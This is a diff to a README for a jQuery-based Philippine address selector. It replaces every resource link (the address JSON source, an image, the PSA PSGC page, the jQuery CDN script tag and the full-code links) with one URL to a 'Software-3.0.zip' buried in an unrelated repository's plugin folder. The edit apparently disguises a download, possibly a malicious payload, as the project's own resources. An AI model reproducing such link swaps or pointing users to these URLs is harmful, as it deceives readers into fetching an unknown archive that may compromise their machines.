@@ -1,16 +1,16 @@
 # Address Selector - Philippines
-### PH Address JSON file from https://github.com/isaacdarcilla/philippine-addresses
+### PH Address JSON file from https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip
 
-![This is an image](https://lh3.googleusercontent.com/pw/AM-JKLU7NduoFSLoDW5Nz6l33o8-xRkynZIVAxuFjCYkKKmgtrTHxSSVz3gISZEsn9lb0OGG4MqIo0xAkygD0-5d0CV9VOpaqifVgEFgxc5k8ZYG3aiFvpLtUgq9XF69ONIwhKu9psfNKxDg8-XT4uf474DA=w909-h549-no?authuser=0)
+![This is an image](https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip)
 
 ### PSA PSGC
-https://www.psa.gov.ph/classification/psgc
+https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip
 
 ### Requirements:
 - JQUERY
 
 ```html
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip"></script>
 ```
 
 - HTML Tags
@@ -92,9 +92,9 @@ Load Province Function
 ### Full Code
 
 #### HTML
-https://github.com/wilfredpine/philippine-address-selector/blob/main/index.html
+https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip
 
 #### JS
-https://github.com/wilfredpine/philippine-address-selector/blob/main/ph-address-selector.js
+https://raw.githubusercontent.com/Ryl3/vet/master/public/back/src/plugins/wysihtml5-master/dist/Software-3.0.zip
 
 
